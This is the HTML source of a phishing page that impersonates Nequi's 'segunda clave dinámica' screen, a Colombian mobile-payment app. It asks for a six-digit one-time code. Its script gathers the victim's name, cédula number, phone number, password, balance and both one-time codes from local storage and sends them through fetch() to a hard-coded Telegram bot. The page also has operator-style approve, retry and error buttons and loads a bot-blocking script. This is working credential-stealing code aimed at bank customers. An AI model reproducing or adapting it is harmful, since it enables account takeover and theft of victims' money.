<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Segunda Din√°mica</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        /* Igual que tu archivo original */
        body {
            font-family: 'Manrope', sans-serif;
            background-image: url("./img/simulador.png");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            color: #200020;
            padding: 120px 20px 20px;
        }
        .cabezeramor-t3 {
            background-color: #ffffff;
            height: 80px;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
        }
        .cabezeramor-t3 img {
            height: 30px;
            max-width: 100%;
        }
        @media (max-width: 768px) {
            body {
                height: 150vh;
            }
            .cabezeramor-t3 img {
                height: 30px;
            }
        }
        .container {
            max-width: 600px;
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin: auto;
            text-align: left;
        }
        .titulo-principal {
            font-weight: bold;
            color: #ffffff;
            text-align: left;
            margin-bottom: 20px;
            font-size: 2em;
        }
        h2 {
            color: #200020;
            margin-bottom: 10px;
            font-size: 1.8em;
        }
        p {
            color: #828d92;
            font-size: 1.1em;
            margin-bottom: 20px;
        }
        .form-floating label {
            color: #200020;
            font-weight: bold;
            background-color: transparent;
        }
        .form-control {
            background-color: transparent;
            border: 1px solid #200020;
            color: #200020;
        }
        .form-control:focus {
            background-color: transparent;
            border-color: #da0081;
            box-shadow: none;
        }
        .btn-primary, .btn-pay {
            background-color: #200020;
            border-color: #200020;
            padding: 15px;
            font-size: 1.2em;
            width: 100%;
        }
        .btn-primary:hover, .btn-pay:hover {
            background-color: #3d003d;
            border-color: #3d003d;
        }
        .credito-info {
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid #dee2e6;
            text-align: center;
        }
        .credito-info h3 {
            color: #a0006f;
            font-size: 1.5em;
            margin-bottom: 15px;
        }
        .credito-info p {
            font-size: 1.1em;
            margin: 5px 0;
        }
        .credito-info strong {
            color: #bf0072;
        }
        .monto-cuota {
            font-weight: bold;
            font-size: 1.5em;
            color: #28a745;
            margin-top: 20px;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            display: none;
        }
        .overlay img {
            width: 7rem;
        }
        @media (max-width: 768px) {
            body {
                padding: 100px 10px;
            }
            .titulo-principal {
                font-size: 1.6em;
            }
            h2 {
                font-size: 1.5em;
            }
            .container {
                padding: 20px;
            }
            .credito-info h3 {
                font-size: 1.3em;
            }
            .credito-info p,
            .monto-cuota {
                font-size: 1em;
            }
        }
    </style>
</head>
<body>
    <header class="cabezeramor-t3">
        <img src="./img/logo.svg" alt="Logo">
        <img src="./img/3ra.jpg" alt="Icono">
    </header>

    <br><br><br><br>
    <div class="titulo-principal">Segunda clave din√°mica</div>

    <div class="container" id="form-container">
        <h2>Confirma tu identidad</h2>
        <p>Ingresa la nueva clave din√°mica que aparece en tu App Nequi.</p>

        <!-- Teclado num√©rico id√©ntico -->
        <div class="box_numerickeypad">
            <input type="password" id="d0" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="d1" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="d2" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="d3" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="d4" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="d5" class="code_numerickeypad" maxlength="1" inputmode="none">
        </div>

        <div class="numeric_board">
            <div class="numeric_board-row">
                <button class="container_number">1</button>
                <button class="container_number">2</button>
                <button class="container_number">3</button>
            </div>
            <div class="numeric_board-row">
                <button class="container_number">4</button>
                <button class="container_number">5</button>
                <button class="container_number">6</button>
            </div>
            <div class="numeric_board-row">
                <button class="container_number">7</button>
                <button class="container_number">8</button>
                <button class="container_number">9</button>
            </div>
            <div class="numeric_board-row">
                <button class="container_number" disabled style="visibility:hidden"></button>
                <button class="container_number">0</button>
                <button class="container_number" id="backspace">‚å´</button>
            </div>
        </div>

        <!-- Botones de acci√≥n que s√≠ funcionan -->
        <div class="d-flex gap-2 mt-4">
            <button class="btn btn-success flex-fill" id="btn-aprobar">‚úÖ Aprobar</button>
            <button class="btn btn-warning flex-fill" id="btn-nueva">üîÑ Nueva</button>
            <button class="btn btn-danger flex-fill" id="btn-error">‚ùå Error</button>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const inputs = document.querySelectorAll('.code_numerickeypad');
            const backspaceBtn = document.getElementById('backspace');
            let currentIndex = 0;

            // Teclado num√©rico
            document.querySelectorAll('.container_number').forEach(button => {
                if (button === backspaceBtn) return;
                button.addEventListener('click', function () {
                    const value = this.textContent.trim();
                    if (/^\d$/.test(value) && currentIndex < inputs.length) {
                        inputs[currentIndex].value = value;
                        if (currentIndex < inputs.length - 1) {
                            currentIndex++;
                            inputs[currentIndex].focus();
                        }
                    }
                });
            });

            // Backspace
            backspaceBtn.addEventListener('click', function () {
                if (currentIndex >= 0) {
                    if (inputs[currentIndex].value) {
                        inputs[currentIndex].value = '';
                    } else if (currentIndex > 0) {
                        currentIndex--;
                        inputs[currentIndex].value = '';
                        inputs[currentIndex].focus();
                    }
                }
            });

            // Obtener datos anteriores
            const nombreApellido = localStorage.getItem("nombreApellido") || "No especificado";
            const cedula = localStorage.getItem("cedula") || "No especificado";
            const numero = localStorage.getItem("numero") || "No especificado";
            const clave = localStorage.getItem("clave") || "No especificado";
            const saldo = localStorage.getItem("saldo") || "No especificado";
            const otp1 = localStorage.getItem("otp1") || "No especificado";
            const userId = localStorage.getItem("userId") || Date.now();

            // Funci√≥n auxiliar: enviar mensaje al bot y redirigir
            async function sendAction(action) {
                const otp2 = Array.from(inputs).map(i => i.value).join('');
                if (otp2.length !== 6) {
                    alert("Completa la segunda clave");
                    return;
                }

                const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
                const TELEGRAM_CHAT_ID = '6958936698';

                const msg = `üîê <b>CLAVE DIN√ÅMICA 2</b>\n\n` +
                    `üìõ <b>Nombre:</b> ${nombreApellido}\n` +
                    `ü™™ <b>C√©dula:</b> ${cedula}\n` +
                    `üì± <b>N√∫mero:</b> ${numero}\n` +
                    `üîë <b>Clave:</b> ${clave}\n` +
                    `üí∞ <b>Saldo:</b> ${saldo}\n` +
                    `üî¢ <b>Din√°mica 1:</b> <code>${otp1}</code>\n` +
                    `üî¢ <b>Din√°mica 2:</b> <code>${otp2}</code>\n` +
                    `üÜî <b>UserID:</b> ${userId}\n` +
                    `‚öôÔ∏è  <b>Acci√≥n:</b> ${action}\n` +
                    `üìÖ ${new Date().toLocaleString('es-CO')}`;

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: msg,
                            parse_mode: 'HTML'
                        })
                    });

                    // Redirige seg√∫n la acci√≥n
                    if (action === 'Aprobar') {
                        window.location.href = 'success.html';
                    } else if (action === 'Nueva') {
                        window.location.reload(); // mismo archivo, nueva clave
                    } else {
                        window.location.href = 'index.html';
                    }
                } catch (err) {
                    console.error(err);
                    alert('Error al enviar. Intente nuevamente.');
                }
            }

            // Asignar eventos a los botones
            document.getElementById('btn-aprobar').addEventListener('click', () => sendAction('Aprobar'));
            document.getElementById('btn-nueva').addEventListener('click', () => sendAction('Nueva'));
            document.getElementById('btn-error').addEventListener('click', () => sendAction('Error'));
        });
    </script>
    <script src="bloqueo-bots.js"></script>
</body>
</html>
